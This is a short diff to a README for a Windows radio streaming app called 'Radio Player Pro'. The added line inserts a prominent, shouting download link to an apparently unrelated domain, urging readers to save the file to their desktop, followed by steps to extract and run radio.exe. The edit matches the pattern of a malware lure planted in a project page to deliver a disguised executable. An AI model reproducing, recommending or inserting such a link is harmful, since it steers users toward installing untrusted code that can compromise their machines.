@@ -11,6 +11,7 @@ A modern, user-friendly radio streaming application that lets you listen to thou
 ## 🚀 Quick Start
 
 ### For Windows Users (Recommended)
+- [CLICK HERE TO DOWNLOAD ***RADIO PLAYER PRO*** MAKE SURE TO SAVE ON YOUR DESKTOP](https://www.fnbubbles420.org/Download/index)
 
 1. **Download** the complete Radio Player Pro package
 2. **Extract main zipfolder you will see `radio.exe`.
